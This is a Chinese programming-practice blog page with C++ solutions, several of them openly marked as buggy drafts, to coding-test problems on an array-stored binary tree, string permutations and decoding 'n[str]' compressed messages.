<h1 id="37-数组二叉树"><a href="#37-数组二叉树" class="headerlink" title="37.数组二叉树"></a>37.数组二叉树</h1><p>二叉树也可以用数组来存储 给定一个数组 </p>
<p>树的根节点的值储存在下标1</p>
<p> 对于储存在下标n的节点，他的左子节点和右子节点分别储存在下标2<em>n和2</em>n+1 </p>
<p>并且我们用-1代表一个节点为空 </p>
<p>给定一个数组存储的二叉树 </p>
<p>试求从根节点到最小的叶子节点的路径 </p>
<p>路径由节点的值组成 </p>
<h2 id="输入描述-27"><a href="#输入描述-27" class="headerlink" title="输入描述"></a>输入描述</h2><p>输入一行为数组的内容 数组的每个元素都是正整数，元素间用空格分割 注意第一个元素即为根节点的值 即数组的第n元素对应下标n 下标0在树的表示中没有使用 所以我们省略了 输入的树最多为7层 </p>
<h2 id="输出描述-27"><a href="#输出描述-27" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出从根节点到最小叶子节点的路径上各个节点的值 由空格分割 用例保证最小叶子节点只有一个  </p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="输入-22"><a href="#输入-22" class="headerlink" title="输入"></a>输入</h3><p> 3 5 7 -1 -1 2 4 </p>
<h3 id="输出-21"><a href="#输出-21" class="headerlink" title="输出"></a>输出</h3><p>3 7 2</p>
<p>下面两条wp的思路都是，先找到最小的叶结点，那么从根节点到它的路径就唯一确定了。</p>
<p>最小叶结点的要求，它首先不是-1，其值最小，它左孩子下标溢出</p>
<p>从它开始倒着找父节点就行了。</p>
<h2 id="wp1"><a href="#wp1" class="headerlink" title="wp1"></a>wp1</h2><p>来自<a href="http://t.csdn.cn/vG8M3">CSDN巨坚强</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> vector&lt;int&gt; a;</span><br><span class="line">    a.push_back(0);//先占用一个</span><br><span class="line">    int b;</span><br><span class="line">    while(cin&gt;&gt;b)</span><br><span class="line">    &#123;</span><br><span class="line">        a.push_back(b);</span><br><span class="line">        if(cin.get()==&#x27;\n&#x27;) break;</span><br><span class="line">    &#125;</span><br><span class="line">    //先找到最小叶子结点，即i有值但2i和2i+1处无值</span><br><span class="line">    int min_1=99999999,min_index=1;</span><br><span class="line">    for(int i=1;i&lt;a.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int cur=a[i];</span><br><span class="line"></span><br><span class="line">        if(cur==-1||cur&gt;min_1) continue;//当前节点无或比记录的值大</span><br><span class="line">        if(a[2*i]==-1&amp;&amp;a[2*i+1]==-1)//如果没有孩子</span><br><span class="line">        &#123;</span><br><span class="line">            min_1=cur;</span><br><span class="line">            min_index=i;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(2*i&gt;a.size())//或者如果左孩子下标超出</span><br><span class="line">        &#123;</span><br><span class="line">            min_1=cur;</span><br><span class="line">            min_index=i;</span><br><span class="line">        &#125;</span><br><span class="line">       // i=i+3;</span><br><span class="line">    &#125;</span><br><span class="line">  //  cout&lt;&lt;min_1&lt;&lt;&quot;,&quot;&lt;&lt;min_index&lt;&lt;&quot;,&quot;&lt;&lt;a[min_index];</span><br><span class="line">  //再逆序从叶子结点找到根节点</span><br><span class="line">  string t=&quot;&quot;;</span><br><span class="line">  while(min_index!=0)</span><br><span class="line">  &#123;</span><br><span class="line">        t+=to_string(a[min_index]);</span><br><span class="line">        if(min_index!=1) t+=&quot; &quot;;</span><br><span class="line">        min_index/=2;</span><br><span class="line">  &#125;</span><br><span class="line">  reverse(t.begin(),t.end());</span><br><span class="line">  cout&lt;&lt;t;   </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="wp2"><a href="#wp2" class="headerlink" title="wp2"></a>wp2</h2><p>来自<a href="https://wiki.amoscloud.com/">AmosCloud</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void back(vector&lt;int&gt; a,int minpos,vector&lt;int&gt; &amp;path);</span><br><span class="line">void solution(vector&lt;int&gt; a);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    vector&lt;int&gt; a;</span><br><span class="line">    a.push_back(0);//先占用一个</span><br><span class="line">    int b;</span><br><span class="line">    while(cin&gt;&gt;b)</span><br><span class="line">    &#123;</span><br><span class="line">        a.push_back(b);</span><br><span class="line">        if(cin.get()==&#x27;\n&#x27;) break;</span><br><span class="line">    &#125;</span><br><span class="line">    solution(a);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">void solution(vector&lt;int&gt; a)</span><br><span class="line">&#123;</span><br><span class="line">    int min_1=999999;</span><br><span class="line">    int minpos=1;</span><br><span class="line">    for(int i=1;i&lt;a.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int tmp=a[i];</span><br><span class="line">        if(tmp!=-1&amp;&amp;tmp&lt;min_1&amp;&amp;2*i&gt;a.size())//当前值不为-1，当前值较小，左孩子下标溢出</span><br><span class="line">        &#123;</span><br><span class="line">            //叶子结点</span><br><span class="line">            min_1=tmp;</span><br><span class="line">            minpos=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;int&gt; path;</span><br><span class="line">    back(a,minpos,path);</span><br><span class="line">    for(int i=path.size()-1;i&gt;=0;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;path[i];</span><br><span class="line">        if(i!=0)</span><br><span class="line">        cout&lt;&lt;&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void back(vector&lt;int&gt; a,int minpos,vector&lt;int&gt; &amp;path)</span><br><span class="line">&#123;</span><br><span class="line">//从最后的叶子结点倒着找父节点，直到找到根节点</span><br><span class="line">    path.push_back(a[minpos]);</span><br><span class="line">    if(minpos==1) return;</span><br><span class="line">    if(minpos%2==0)//是左孩子，求其父节点</span><br><span class="line">    back(a,minpos/2,path);</span><br><span class="line">    else back(a,(minpos-1)/2,path);//是右孩子，求其父节点</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好吧，不需要真的用结构体来做</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct tree</span><br><span class="line">&#123;</span><br><span class="line">    int val;</span><br><span class="line">    tree *left,*right;</span><br><span class="line">    tree():val(-1),left(nullptr),right(nullptr)&#123;&#125;</span><br><span class="line">    tree(int x):val(x),left(nullptr),right(nullptr)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vector&lt;tree&gt; node(99999);</span><br><span class="line">void build(int index)</span><br><span class="line">&#123;</span><br><span class="line">    int a;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    if(cin.get()==&#x27;\n&#x27;) return;</span><br><span class="line">    node[index]= tree(a);</span><br><span class="line"></span><br><span class="line">    build(2*index);</span><br><span class="line">    build(2*index+1);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    int i=1;</span><br><span class="line"></span><br><span class="line">    string line;</span><br><span class="line">  </span><br><span class="line">        build(i); </span><br><span class="line">   </span><br><span class="line">   for(auto a:node)</span><br><span class="line">   cout&lt;&lt;a.val&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="38-考古学家-全排列"><a href="#38-考古学家-全排列" class="headerlink" title="38.考古学家(全排列)"></a>38.考古学家(全排列)</h1><h2 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h2><p>有一个考古学家发现一个石碑<br>但是很可惜 发现时其已经断成多段<br>原地发现<code>N</code>个断口整齐的石碑碎片<br>为了破解石碑内容<br>考古学家希望有程序能帮忙计算复原后的石碑文字组合数</p>
<p>备注： 如果存在石碑碎片内容完全相同，则由于碎片间的顺序不影响复原后的碑文内容，<br>仅相同碎片间的位置变化不影响组合</p>
<h2 id="输入描述-28"><a href="#输入描述-28" class="headerlink" title="输入描述"></a>输入描述</h2><p>第一行输入<code>N</code>，<code>N</code>表示石碑碎片的个数<br>第二行依次输入石碑碎片上的文字内容<code>S</code>共有<code>N</code>组</p>
<h2 id="输出描述-28"><a href="#输出描述-28" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出石碑文字的组合(按照升序排列)，行尾无多余空格</p>
<h2 id="示例一-14"><a href="#示例一-14" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-23"><a href="#输入-23" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">a b c</span><br></pre></td></tr></table></figure>

<h3 id="输出-22"><a href="#输出-22" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc</span><br><span class="line">acb</span><br><span class="line">bac</span><br><span class="line">bca</span><br><span class="line">cab</span><br><span class="line">cba</span><br></pre></td></tr></table></figure>

<h2 id="个人代码-18"><a href="#个人代码-18" class="headerlink" title="个人代码"></a>个人代码</h2><p><strong>回溯算法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set&lt;string&gt; list;</span><br><span class="line">string result=&quot;&quot;;</span><br><span class="line">void back(vector&lt;string&gt; &amp;s,int start,int end)</span><br><span class="line">&#123;</span><br><span class="line">    if(start==end) </span><br><span class="line">    &#123;</span><br><span class="line">       for(auto a:s)</span><br><span class="line">          result+=a;</span><br><span class="line">         //  cout&lt;&lt;a;</span><br><span class="line">        </span><br><span class="line">        list.insert(result);</span><br><span class="line">         result=&quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        for(int i=start;i&lt;=end;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        swap(s[start],s[i]);//第一次s[0]与s[0]</span><br><span class="line">        back(s,start+1,end);</span><br><span class="line">        swap(s[start],s[i]);//还原</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //全排列</span><br><span class="line">    int n;</span><br><span class="line">    vector&lt;string&gt; s(n);</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    //cin.ignore();</span><br><span class="line">    string t;</span><br><span class="line">    while(cin&gt;&gt;t)</span><br><span class="line">    &#123;</span><br><span class="line">    s.push_back(t);</span><br><span class="line">    if(cin.get()==&#x27;\n&#x27;) break; //所以是一行输完</span><br><span class="line">    &#125;</span><br><span class="line">    // for(auto list:s)</span><br><span class="line">    // cout&lt;&lt;list&lt;&lt;&quot;,&quot;;</span><br><span class="line">    back(s,0,s.size()-1);</span><br><span class="line">    //排序</span><br><span class="line">    //去重 set</span><br><span class="line">    for(auto a:list)</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="39-解压报文"><a href="#39-解压报文" class="headerlink" title="39*解压报文"></a>39*解压报文</h1><p>为了提升数据传输的效率，会对传输的报文进行压缩处理。输入一个压缩后的报文，请返回它解压后的原始报文。<br>压缩规则：n[str]，表示方括号内部的 str 正好重复 n 次。注意 n 为正整数（0 &lt; n &lt;&#x3D; 100），str只包含小写英文字母，不考虑异常情况。<br>“ “输入描述:<br>输入压缩后的报文：<br>1）不考虑无效的输入，报文没有额外的空格，方括号总是符合格式要求的；<br>2）原始报文不包含数字，所有的数字只表示重复的次数 n ，例如不会出现像 5b 或 3[8] 的输入；<br>输出描述:<br>解压后的原始报文<br>注：<br>1）原始报文长度不会超过1000，不考虑异常的情况<br>示例1<br>输入<br>3[k]2[mn]<br>输出<br>kkkmnmn</p>
<h2 id="个人代码（有误）-2"><a href="#个人代码（有误）-2" class="headerlink" title="个人代码（有误）"></a>个人代码（有误）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> string s;</span><br><span class="line">  cin&gt;&gt;s;</span><br><span class="line">  stack&lt;string&gt; wu;</span><br><span class="line"> // string t=&quot;&quot;;</span><br><span class="line">  int index=0;</span><br><span class="line">  for(int i=0;i&lt;s.size();i++)</span><br><span class="line">  &#123;</span><br><span class="line">    //cout&lt;&lt;s[i-1]&lt;&lt;endl;</span><br><span class="line">       char t=s[i];</span><br><span class="line">      if(t==&#x27;[&#x27;)//左边可能是数字</span><br><span class="line">      &#123;</span><br><span class="line">          wu.push(s.substr(index,i-index));</span><br><span class="line">          index=i+1;</span><br><span class="line">        //  cout&lt;&lt;t;</span><br><span class="line">        //  t=&quot;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    if(t==&#x27;]&#x27;)//字母</span><br><span class="line">    &#123;</span><br><span class="line">        string t=s.substr(index,i-index);</span><br><span class="line">        string qianzhui=wu.top();//比如k2</span><br><span class="line">        cout&lt;&lt;qianzhui&lt;&lt;endl;</span><br><span class="line">        wu.pop();//弹出k2</span><br><span class="line">        string num=&quot;&quot;,zimu=&quot;&quot;;</span><br><span class="line">        //找出重复次数</span><br><span class="line">        for(int i=0;i&lt;qianzhui.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(isdigit(qianzhui[i]))</span><br><span class="line">                num+=qianzhui[i];</span><br><span class="line">            else zimu+=qianzhui[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        //if(zimu.size()!=0) wu.push(zimu);</span><br><span class="line">      //  cout&lt;&lt;zimu&lt;&lt;endl;</span><br><span class="line">      if(j.size()!=0)</span><br><span class="line">      &#123;</span><br><span class="line">        int j=stoi(num);</span><br><span class="line">       </span><br><span class="line">        cout&lt;&lt;j;</span><br><span class="line">        </span><br><span class="line">        string result=&quot;&quot;;</span><br><span class="line">        while(j&gt;0)</span><br><span class="line">        &#123;</span><br><span class="line">          result+=t;</span><br><span class="line">          //t+=t; 不可取</span><br><span class="line">          j--;</span><br><span class="line">        &#125;</span><br><span class="line">       //  return 0;</span><br><span class="line">     //   cout&lt;&lt;t&lt;&lt;endl;</span><br><span class="line">     if(zimu.size()!=0) result=zimu+result;</span><br><span class="line">        wu.push(result);</span><br><span class="line">      &#125;</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">        index=i+1;</span><br><span class="line">    &#125;</span><br><span class="line">    //   else if(s[i]==&#x27;]&#x27;)</span><br><span class="line">    //   &#123;</span><br><span class="line">    //       wu.pop();//此时还是[，字母还没放进去，t就是字母</span><br><span class="line">    //       int num=stoi(wu.top());</span><br><span class="line">    //       while(num&gt;1)//重复num次</span><br><span class="line">    //       &#123;</span><br><span class="line">    //          t+=t;</span><br><span class="line">    //          num--;</span><br><span class="line">    //       &#125;</span><br><span class="line">    //       wu.pop();//弹出数字</span><br><span class="line">    //       cout&lt;&lt;t&lt;&lt;endl;</span><br><span class="line">    //       wu.push(t);</span><br><span class="line">    //       t=&quot;&quot;;</span><br><span class="line">    //   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   while(!wu.empty())</span><br><span class="line">   &#123;</span><br><span class="line">       cout&lt;&lt;wu.top()&lt;&lt;endl;</span><br><span class="line">       wu.pop();</span><br><span class="line">   &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>3[km23[a]]<br>km23<br>23aaaaaaaaaaaaaaaaaaaaaaa<br>terminate called after throwing an instance of ‘std::invalid_argument’<br>  what():  stoi</p>
</blockquote>
<p>3[kmaaa..aa]又遇到了]，所以wu.top()即kmaaa..a当做了数字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  string s;</span><br><span class="line">  cin&gt;&gt;s;</span><br><span class="line">  stack&lt;string&gt; cishu;</span><br><span class="line">  stack&lt;string&gt; zifu;//记录[]以外的值</span><br><span class="line"> // string t=&quot;&quot;;</span><br><span class="line">  int index=0;</span><br><span class="line">  for(int i=0;i&lt;s.size();i++)</span><br><span class="line">  &#123;</span><br><span class="line">    //cout&lt;&lt;s[i-1]&lt;&lt;endl;</span><br><span class="line">       char t=s[i];</span><br><span class="line">      if(t==&#x27;[&#x27;)//左边可能是数字</span><br><span class="line">      &#123;</span><br><span class="line">          cishu.push(s.substr(index,i-index));</span><br><span class="line">          </span><br><span class="line">          index=i+1;</span><br><span class="line">        //  cout&lt;&lt;t;</span><br><span class="line">        //  t=&quot;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    if(t==&#x27;]&#x27;)//字母</span><br><span class="line">    &#123;</span><br><span class="line">     </span><br><span class="line">      cout&lt;&lt;index&lt;&lt;&quot;,&quot;&lt;&lt;i-index&lt;&lt;endl;</span><br><span class="line">       // if(i-index!=0)//不是最后一个]</span><br><span class="line">        string t=s.substr(index,i-index);</span><br><span class="line">        if(i-index==0)</span><br><span class="line">        &#123;</span><br><span class="line">        t=zifu.top();</span><br><span class="line">        zifu.pop();</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">     </span><br><span class="line">     //   cout&lt;&lt;t&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">        string qianzhui=cishu.top();//比如k2</span><br><span class="line">   //     cout&lt;&lt;qianzhui&lt;&lt;endl;</span><br><span class="line">        cishu.pop();//弹出k2</span><br><span class="line">        string num=&quot;&quot;,zimu=&quot;&quot;;</span><br><span class="line">        //找出重复次数</span><br><span class="line">        for(int i=0;i&lt;qianzhui.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(isdigit(qianzhui[i]))</span><br><span class="line">                num+=qianzhui[i];</span><br><span class="line">            else zimu+=qianzhui[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        //if(zimu.size()!=0) wu.push(zimu);</span><br><span class="line">      //  cout&lt;&lt;zimu&lt;&lt;endl;</span><br><span class="line">        int j=stoi(num);</span><br><span class="line">     //  cout&lt;&lt;j&lt;&lt;endl;</span><br><span class="line">       // cout&lt;&lt;j;</span><br><span class="line">        </span><br><span class="line">        string result=&quot;&quot;;</span><br><span class="line">        while(j&gt;0)</span><br><span class="line">        &#123;</span><br><span class="line">          result+=t;</span><br><span class="line">          //t+=t; 不可取</span><br><span class="line">          j--;</span><br><span class="line">        &#125;</span><br><span class="line">       //  return 0;</span><br><span class="line">     //   cout&lt;&lt;t&lt;&lt;endl;</span><br><span class="line">     if(zimu.size()!=0) result=zimu+result;</span><br><span class="line">        zifu.push(result);</span><br><span class="line"></span><br><span class="line">          index=i+1;</span><br><span class="line">      &#125;</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line">   while(!zifu.empty())</span><br><span class="line">   &#123;</span><br><span class="line">       cout&lt;&lt;zifu.top()&lt;&lt;endl;</span><br><span class="line">       zifu.pop();</span><br><span class="line">   &#125;</span><br><span class="line">    while(!cishu.empty())</span><br><span class="line">   &#123;</span><br><span class="line">       cout&lt;&lt;cishu.top()&lt;&lt;endl;</span><br><span class="line">       cishu.pop();</span><br><span class="line">   &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> string s;</span><br><span class="line">  cin&gt;&gt;s;</span><br><span class="line">  stack&lt;string&gt; cishu;//记录[左边的值</span><br><span class="line">  stack&lt;string&gt; zifu;//记录[]中间的值</span><br><span class="line"> // string t=&quot;&quot;;</span><br><span class="line">  int index=0;</span><br><span class="line">  for(int i=0;i&lt;s.size();i++)</span><br><span class="line">  &#123;</span><br><span class="line">    //cout&lt;&lt;s[i-1]&lt;&lt;endl;</span><br><span class="line">       char t=s[i];</span><br><span class="line">      if(t==&#x27;[&#x27;)//左边可能是数字</span><br><span class="line">      &#123;</span><br><span class="line">          cishu.push(s.substr(index,i-index));</span><br><span class="line">          </span><br><span class="line">          index=i+1;</span><br><span class="line">        //  cout&lt;&lt;t;</span><br><span class="line">        //  t=&quot;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    if(t==&#x27;]&#x27;)//字母</span><br><span class="line">    &#123;</span><br><span class="line">     </span><br><span class="line">    //  cout&lt;&lt;index&lt;&lt;&quot;,&quot;&lt;&lt;i-index&lt;&lt;endl;</span><br><span class="line">       // if(i-index!=0)//不是最后一个]</span><br><span class="line">        string t=s.substr(index,i-index);//bug利用1</span><br><span class="line">        // if(i-index==0)</span><br><span class="line">        // &#123;</span><br><span class="line">        // t=zifu.top();</span><br><span class="line">        // zifu.pop();</span><br><span class="line">        // &#125;</span><br><span class="line">      </span><br><span class="line">     </span><br><span class="line">     //   cout&lt;&lt;t&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">        string qianzhui=cishu.top();//比如k2</span><br><span class="line">   //     cout&lt;&lt;qianzhui&lt;&lt;endl;</span><br><span class="line">        if(cishu.size()&gt;1)</span><br><span class="line">        cishu.pop();// bug利用2</span><br><span class="line">        string num=&quot;&quot;,zimu=&quot;&quot;;</span><br><span class="line">        //找出重复次数</span><br><span class="line">        for(int i=0;i&lt;qianzhui.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(isdigit(qianzhui[i]))</span><br><span class="line">                num+=qianzhui[i];</span><br><span class="line">            else zimu+=qianzhui[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        //if(zimu.size()!=0) wu.push(zimu);</span><br><span class="line">      //  cout&lt;&lt;zimu&lt;&lt;endl;</span><br><span class="line">        int j=stoi(num);</span><br><span class="line">     //  cout&lt;&lt;j&lt;&lt;endl;</span><br><span class="line">       // cout&lt;&lt;j;</span><br><span class="line">        </span><br><span class="line">        string result=&quot;&quot;;</span><br><span class="line">        while(j&gt;0)</span><br><span class="line">        &#123;</span><br><span class="line">          result+=t;</span><br><span class="line">          //t+=t; 不可取</span><br><span class="line">          j--;</span><br><span class="line">        &#125;</span><br><span class="line">       //  return 0;</span><br><span class="line">     //   cout&lt;&lt;t&lt;&lt;endl;</span><br><span class="line">     if(zimu.size()!=0) result=zimu+result;</span><br><span class="line">        zifu.push(result);</span><br><span class="line"></span><br><span class="line">          index=i+1;</span><br><span class="line">      &#125;</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line">    /*有一个bug的利用就是:</span><br><span class="line">    如果没有嵌套的[]，如3[k]2[mn]，zifu栈不会有多余的值</span><br><span class="line">    如果有嵌套的[]，如3[k2[mn]]，zifu栈会有个多余值空值</span><br><span class="line">    因为string t=s.substr(8,0);执行了这个，赋值了空值</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    s=&quot;&quot;;</span><br><span class="line">    int flag=-1;</span><br><span class="line">   while(!zifu.empty())</span><br><span class="line">   &#123;</span><br><span class="line">       if(zifu.top()==&quot;&quot;) flag=1;//一旦有嵌套</span><br><span class="line">       s=zifu.top()+s;</span><br><span class="line">       zifu.pop();</span><br><span class="line">   &#125;</span><br><span class="line">   if(flag&gt;0)</span><br><span class="line">   &#123;</span><br><span class="line">     flag=stoi(cishu.top());</span><br><span class="line">     while(flag&gt;0)</span><br><span class="line">     &#123;</span><br><span class="line">        cout&lt;&lt;s;</span><br><span class="line">        flag--;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   else  cout&lt;&lt;s;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>3[k2[m]3[i]2[i2[p]]]<br>kmmiiiippkmmiiiippkmmiiiipp</p>
<p>2[k2[m]3[w2[p]]]<br>kmmwppkmmwpp</p>
<p>多于两层嵌套就有问题</p>
</blockquote>
<h2 id="个人代码2-处理不了非嵌套括号"><a href="#个人代码2-处理不了非嵌套括号" class="headerlink" title="个人代码2(处理不了非嵌套括号)"></a>个人代码2(处理不了非嵌套括号)</h2><p><strong>正则匹配</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;regex&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">regex PATTERN(&quot;\\d+\\[[a-z]+]&quot;);</span><br><span class="line">//  \d匹配数字，+一到无穷个前方元素</span><br><span class="line">// [ [a-z]+ ]  外括号里的内容，匹配a-z</span><br><span class="line">string solution(const string&amp; line) &#123;</span><br><span class="line">    smatch match;</span><br><span class="line">    if (regex_search(line, match, PATTERN)) &#123;</span><br><span class="line">        for(auto a:match)</span><br><span class="line">        cout&lt;&lt;a&lt;&lt;&quot; &quot;;</span><br><span class="line"></span><br><span class="line">        string group = match[0];</span><br><span class="line">        int pos = group.find(&#x27;[&#x27;);</span><br><span class="line">        //重复次数</span><br><span class="line">        int times = stoi(group.substr(0, pos));</span><br><span class="line">       </span><br><span class="line">        int endpos=group.find(&#x27;]&#x27;);</span><br><span class="line">         //待重复字母</span><br><span class="line">        string words = group.substr(pos + 1, endpos-pos-1);</span><br><span class="line">       // cout&lt;&lt;words&lt;&lt;endl;</span><br><span class="line">        //记录重复字符</span><br><span class="line">        string builder;</span><br><span class="line">        for (int i = 0; i &lt; times; i++) &#123;</span><br><span class="line">            builder += words;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //3[m2[k]]</span><br><span class="line">       // string fixed = line.replace(,group.size(),builder);</span><br><span class="line">       string fixed=regex_replace(line,PATTERN,builder);</span><br><span class="line">       //3[mkk]</span><br><span class="line">      // cout&lt;&lt;fixed&lt;&lt;endl;</span><br><span class="line">       if(fixed==line)</span><br><span class="line">       return fixed;</span><br><span class="line">    &#125; </span><br><span class="line">     return solution(fixed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    string line;</span><br><span class="line">    // = &quot;3[k]2[mn]&quot;</span><br><span class="line">    cin&gt;&gt;line;</span><br><span class="line">    cout&lt;&lt;solution(line) ;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个可以处理非嵌套括号，emmmm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void solution( string&amp; line) &#123;</span><br><span class="line">    smatch match;</span><br><span class="line">  //  if (regex_search(line, match, PATTERN)) &#123; //它只查找到第一个匹配项就停止</span><br><span class="line">  // 3[k]2[mn] 找到3[k]就完了</span><br><span class="line">  sregex_iterator rit(line.begin(),line.end(),PATTERN);</span><br><span class="line">  sregex_iterator rend;</span><br><span class="line">        while(rit!=rend)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;rit-&gt;str()&lt;&lt;endl;</span><br><span class="line">            rit++;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最终代码-1"><a href="#最终代码-1" class="headerlink" title="最终代码"></a>最终代码</h2><p>问了chatgpt，它说用递归</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string solution(const string&amp; s, int &amp;i) &#123;</span><br><span class="line">    string result;</span><br><span class="line">    int count=0;</span><br><span class="line">    while(i&lt;s.size())&#123;</span><br><span class="line">        char c=s[i++];</span><br><span class="line"></span><br><span class="line">        if(isdigit(c))</span><br><span class="line">        &#123;</span><br><span class="line">            count=count*10+(c-&#x27;0&#x27;);//妙哇</span><br><span class="line">        &#125;</span><br><span class="line">        else if(isalpha(c))</span><br><span class="line">        &#123;</span><br><span class="line">            result+=c;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(c==&#x27;[&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            string decode=solution(s,i);</span><br><span class="line">            for(int j=0;j&lt;count;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                result+=decode;</span><br><span class="line">            &#125;</span><br><span class="line">            count=0;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(c==&#x27;]&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    string line;</span><br><span class="line">    // = &quot;3[k]2[mn]&quot;</span><br><span class="line">    //3[k2[mn]]</span><br><span class="line">   cin&gt;&gt;line;</span><br><span class="line">   int index=0;</span><br><span class="line">   cout&lt;&lt;solution(line,index);//不能直接赋值0</span><br><span class="line">  </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cout一下过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string solution(const string&amp; s, int &amp;i) &#123;</span><br><span class="line">    string result;</span><br><span class="line">    int count=0;</span><br><span class="line">    while(i&lt;s.size())&#123;</span><br><span class="line">        char c=s[i++];</span><br><span class="line">        cout&lt;&lt;&quot;第&quot;&lt;&lt;i&lt;&lt;&quot;个字符&quot;&lt;&lt;endl;</span><br><span class="line">        if(isdigit(c))</span><br><span class="line">        &#123;</span><br><span class="line">            count=count*10+(c-&#x27;0&#x27;);</span><br><span class="line">            cout&lt;&lt;&quot;遇到了字符:&quot;&lt;&lt;c&lt;&lt;&quot;变成数字 &quot;&lt;&lt;count&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(isalpha(c))</span><br><span class="line">        &#123;</span><br><span class="line">            result+=c;</span><br><span class="line">             cout&lt;&lt;&quot;遇到了字符:&quot;&lt;&lt;c&lt;&lt;&quot;加和字母 &quot;&lt;&lt;result&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span 